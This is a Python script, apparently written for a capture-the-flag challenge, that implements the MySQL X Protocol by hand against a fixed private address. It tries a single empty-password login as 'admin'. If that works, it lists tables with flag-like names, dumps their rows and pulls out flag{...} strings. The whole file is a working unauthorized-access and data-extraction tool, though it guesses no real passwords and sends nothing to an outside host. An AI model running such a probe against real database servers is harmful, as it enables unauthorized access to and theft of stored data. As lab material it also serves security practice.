import base64
import json
import re
import socket
import struct
import sys

HOST = "192.168.2.254"
PORT = 33060
TIMEOUT = 4.0
MAX_FRAME = 8 * 1024 * 1024

# MySQL X Protocol message types used by this focused exchange.
CLIENT_CAPABILITIES_GET = 1
CLIENT_AUTHENTICATE_START = 4
CLIENT_AUTHENTICATE_CONTINUE = 5
CLIENT_STMT_EXECUTE = 12
SERVER_OK = 0
SERVER_ERROR = 1
SERVER_CAPABILITIES = 2
SERVER_AUTHENTICATE_CONTINUE = 3
SERVER_AUTHENTICATE_OK = 4
SERVER_NOTICE = 11
SERVER_COLUMN_META = 12
SERVER_ROW = 13
SERVER_FETCH_DONE = 14
SERVER_FETCH_DONE_MORE = 16
SERVER_STMT_EXECUTE_OK = 17


def varint(value):
    out = bytearray()
    while value > 0x7f:
        out.append((value & 0x7f) | 0x80)
        value >>= 7
    out.append(value)
    return bytes(out)


def pb_bytes(field, data):
    return varint((field << 3) | 2) + varint(len(data)) + data


def pb_string(field, text):
    return pb_bytes(field, text.encode("utf-8"))


def pb_fields(data):
    """Decode protobuf wire values without assuming a particular message schema."""
    result = []
    i = 0

    def read_varint(pos):
        value = 0
        shift = 0
        while pos < len(data) and shift <= 63:
            b = data[pos]
            pos += 1
            value |= (b & 0x7f) << shift
            if not (b & 0x80):
                return value, pos
            shift += 7
        raise ValueError("truncated or oversized protobuf varint")

    while i < len(data):
        key, i = read_varint(i)
        number, wire = key >> 3, key & 7
        if number == 0:
            raise ValueError("protobuf field number zero")
        if wire == 0:
            value, i = read_varint(i)
        elif wire == 1:
            if i + 8 > len(data):
                raise ValueError("truncated fixed64 field")
            value, i = data[i:i + 8], i + 8
        elif wire == 2:
            length, i = read_varint(i)
            if length > len(data) - i:
                raise ValueError("truncated length-delimited field")
            value, i = data[i:i + length], i + length
        elif wire == 5:
            if i + 4 > len(data):
                raise ValueError("truncated fixed32 field")
            value, i = data[i:i + 4], i + 4
        else:
            raise ValueError("unsupported protobuf wire type %d" % wire)
        result.append({"field": number, "wire": wire, "value": value})
    return result


def printable_field(field):
    value = field["value"]
    item = {"field": field["field"], "wire": field["wire"]}
    if isinstance(value, bytes):
        item["length"] = len(value)
        item["base64"] = base64.b64encode(value).decode("ascii")
        try:
            text = value.decode("utf-8")
            if all(ch.isprintable() or ch in "\r\n\t" for ch in text):
                item["text"] = text
        except UnicodeDecodeError:
            pass
    else:
        item["value"] = value
    return item


def message_name(msg_type):
    return {
        0: "OK", 1: "ERROR", 2: "CAPABILITIES", 3: "AUTHENTICATE_CONTINUE",
        4: "AUTHENTICATE_OK", 11: "NOTICE", 12: "RESULTSET_COLUMN_META_DATA",
        13: "RESULTSET_ROW", 14: "RESULTSET_FETCH_DONE",
        16: "RESULTSET_FETCH_DONE_MORE_RESULTSETS", 17: "SQL_STMT_EXECUTE_OK"
    }.get(msg_type, "UNKNOWN")


class Exchange:
    def __init__(self, sock):
        self.sock = sock
        self.frames = []

    def send(self, direction_type, payload, label):
        frame = bytes([direction_type]) + payload
        self.sock.sendall(struct.pack("<I", len(frame)) + frame)
        self.frames.append({"direction": "client", "action": label,
                            "message_type": direction_type, "message_name": label,
                            "payload_base64": base64.b64encode(payload).decode("ascii")})

    def _read_exact(self, count):
        chunks = []
        remaining = count
        while remaining:
            block = self.sock.recv(remaining)
            if not block:
                raise EOFError("peer closed connection while reading a frame")
            chunks.append(block)
            remaining -= len(block)
        return b"".join(chunks)

    def receive(self):
        header = self._read_exact(4)
        length = struct.unpack("<I", header)[0]
        if length < 1 or length > MAX_FRAME:
            raise ValueError("invalid or oversized MySQL X frame length: %d" % length)
        body = self._read_exact(length)
        msg_type, payload = body[0], body[1:]
        record = {"direction": "server", "message_type": msg_type,
                  "message_name": message_name(msg_type),
                  "payload_base64": base64.b64encode(payload).decode("ascii")}
        try:
            record["protobuf_fields"] = [printable_field(x) for x in pb_fields(payload)]
            record["protobuf_parse"] = "parsed"
        except Exception as exc:
            record["protobuf_parse"] = "failed: " + str(exc)
        self.frames.append(record)
        return msg_type, payload, record

    def receive_with_timeout(self, timeout=TIMEOUT):
        self.sock.settimeout(timeout)
        return self.receive()


def decoded_bytes(value):
    try:
        text = value.decode("utf-8")
        if all(ch.isprintable() or ch in "\r\n\t" for ch in text):
            return text
    except UnicodeDecodeError:
        pass
    return {"base64": base64.b64encode(value).decode("ascii"), "hex": value.hex()}


def error_details(payload):
    result = {}
    try:
        for item in pb_fields(payload):
            value = item["value"]
            if item["field"] == 2:
                result["code"] = value
            elif item["field"] == 3 and isinstance(value, bytes):
                result["message"] = value.decode("utf-8", "replace")
            elif item["field"] == 4 and isinstance(value, bytes):
                result["sql_state"] = value.decode("utf-8", "replace")
            elif item["field"] == 1:
                result["severity"] = value
    except Exception as exc:
        result["parse_error"] = str(exc)
    return result


def query_result(exchange, sql):
    # StmtExecute: stmt=1, namespace="sql"=3.
    payload = pb_string(1, sql) + pb_string(3, "sql")
    exchange.send(CLIENT_STMT_EXECUTE, payload, "STMT_EXECUTE")
    columns = []
    rows = []
    response_types = []
    error = None
    completion = None
    while True:
        try:
            msg_type, body, _ = exchange.receive_with_timeout()
        except Exception as exc:
            error = "response incomplete: " + str(exc)
            break
        response_types.append(message_name(msg_type))
        if msg_type == SERVER_COLUMN_META:
            meta = {"name": None, "type": None}
            try:
                for item in pb_fields(body):
                    if item["field"] == 1:
                        meta["type"] = item["value"]
                    elif item["field"] == 2 and isinstance(item["value"], bytes):
                        meta["name"] = item["value"].decode("utf-8", "replace")
                columns.append(meta)
            except Exception as exc:
                columns.append({"parse_error": str(exc)})
        elif msg_type == SERVER_ROW:
            try:
                row_fields = [x for x in pb_fields(body) if x["field"] == 1 and isinstance(x["value"], bytes)]
                rows.append([decoded_bytes(x["value"]) for x in row_fields])
            except Exception as exc:
                rows.append({"parse_error": str(exc), "payload_base64": base64.b64encode(body).decode("ascii")})
        elif msg_type == SERVER_ERROR:
            error = error_details(body)
            completion = "server_error"
            break
        elif msg_type in (SERVER_STMT_EXECUTE_OK, SERVER_FETCH_DONE_MORE):
            completion = message_name(msg_type)
            break
        elif msg_type == SERVER_FETCH_DONE:
            # Fetch-done commonly precedes SQL_STMT_EXECUTE_OK; continue to collect it.
            continue
        elif msg_type == SERVER_NOTICE:
            continue
        else:
            # Retain an unexpected message and avoid interpreting it as query success.
            error = "unexpected response message: %s (%d)" % (message_name(msg_type), msg_type)
            break
    return {"sql": sql, "columns": columns, "rows": rows,
            "response_messages": response_types, "completion": completion,
            "error": error}


def main():
    result = {
        "target": "%s:%d" % (HOST, PORT),
        "protocol": "MySQL X Protocol",
        "authentication": {"username": "admin", "mechanism": "MYSQL41",
                            "password_material": "none supplied; one empty-password attempt only",
                            "verified": False},
        "flag_observed": False,
        "frames": [], "queries": [], "limitations": []
    }
    try:
        with socket.create_connection((HOST, PORT), timeout=TIMEOUT) as sock:
            exchange = Exchange(sock)
            sock.settimeout(1.0)
            # The observed service sends a NOTICE immediately on connection. Read and
            # record unsolicited frames before issuing CapabilitiesGet.
            try:
                first = exchange.receive()
                result["initial_server_frame"] = first[2]["message_name"]
            except socket.timeout:
                result["initial_server_frame"] = "none received before timeout"
            except Exception as exc:
                result["limitations"].append("initial receive: " + str(exc))
                result["frames"] = exchange.frames
                print(json.dumps(result, ensure_ascii=False))
                return

            exchange.send(CLIENT_CAPABILITIES_GET, b"", "CAPABILITIES_GET")
            capabilities_seen = False
            for _ in range(12):
                try:
                    msg_type, body, _ = exchange.receive_with_timeout()
                except Exception as exc:
                    result["limitations"].append("capabilities exchange incomplete: " + str(exc))
                    break
                if msg_type == SERVER_CAPABILITIES:
                    capabilities_seen = True
                    result["capabilities_response"] = "received"
                    break
                if msg_type == SERVER_ERROR:
                    result["capabilities_error"] = error_details(body)
                    break
                if msg_type == SERVER_NOTICE:
                    continue
                result["limitations"].append("unexpected capabilities response: %s (%d)" % (message_name(msg_type), msg_type))
                break

            if not capabilities_seen:
                result["limitations"].append("capabilities response was not verified; authentication was not attempted")
            else:
                # MYSQL41 identifies the account in auth_data. No nonempty password
                # or credential source is available, so do not guess one.
                auth_payload = pb_string(1, "MYSQL41") + pb_bytes(2, b"admin\x00")
                exchange.send(CLIENT_AUTHENTICATE_START, auth_payload, "AUTHENTICATE_START_ADMIN_MYSQL41")
                authenticated = False
                for _ in range(12):
                    try:
                        msg_type, body, _ = exchange.receive_with_timeout()
                    except Exception as exc:
                        result["limitations"].append("authentication exchange incomplete: " + str(exc))
                        break
                    if msg_type == SERVER_AUTHENTICATE_OK:
                        authenticated = True
                        result["authentication"]["verified"] = True
                        result["authentication"]["result"] = "AUTHENTICATE_OK received"
                        break
                    if msg_type == SERVER_AUTHENTICATE_CONTINUE:
                        # This is the sole empty-password response. For an empty MySQL
                        # password MYSQL41 sends an empty response; no password is inferred.
                        exchange.send(CLIENT_AUTHENTICATE_CONTINUE, pb_bytes(1, b""), "AUTHENTICATE_CONTINUE_EMPTY_PASSWORD")
                        result["authentication"]["empty_password_response_sent"] = True
                        continue
                    if msg_type == SERVER_ERROR:
                        result["authentication"]["result"] = "server rejected authentication"
                        result["authentication"]["error"] = error_details(body)
                        break
                    if msg_type == SERVER_NOTICE:
                        continue
                    result["limitations"].append("unexpected authentication response: %s (%d)" % (message_name(msg_type), msg_type))
                    break
                if authenticated:
                    # Inspect metadata for user tables with flag-like names, then read
                    # only those candidate tables in the authenticated session.
                    sql = ("SELECT table_schema, table_name FROM information_schema.tables "
                           "WHERE table_schema NOT IN ('mysql','information_schema','performance_schema','sys') "
                           "AND (table_name LIKE '%flag%' OR table_schema LIKE '%flag%')")
                    discovery = query_result(exchange, sql)
                    result["queries"].append(discovery)
                    candidates = []
                    for row in discovery["rows"]:
                        if isinstance(row, list) and len(row) >= 2 and all(isinstance(x, str) for x in row[:2]):
                            candidates.append((row[0], row[1]))
                    for schema, table in candidates[:20]:
                        q_schema = schema.replace("`", "``")
                        q_table = table.replace("`", "``")
                        query = query_result(exchange, "SELECT * FROM `%s`.`%s` LIMIT 100" % (q_schema, q_table))
                        result["queries"].append(query)
                    texts = []
                    for query in result["queries"]:
                        for row in query.get("rows", []):
                            if isinstance(row, list):
                                texts.extend(x for x in row if isinstance(x, str))
                    flag_pattern = re.compile(r"(?:flag|ctf)\{[^}\r\n]{1,500}\}", re.IGNORECASE)
                    matches = [m.group(0) for text in texts for m in flag_pattern.finditer(text)]
                    result["flag_observed"] = bool(matches)
                    if matches:
                        result["flag_values_observed"] = matches
                    result["flag_table_candidates"] = [{"schema": s, "table": t} for s, t in candidates]
                    if not candidates:
                        result["limitations"].append("no flag-named user table was returned by the metadata query; other storage locations were not tested")
            result["frames"] = exchange.frames
    except Exception as exc:
        result["connection_or_execution_error"] = str(exc)
        if "exchange" in locals():
            result["frames"] = exchange.frames
    print(json.dumps(result, ensure_ascii=False))


if __name__ == "__main__":
    main()

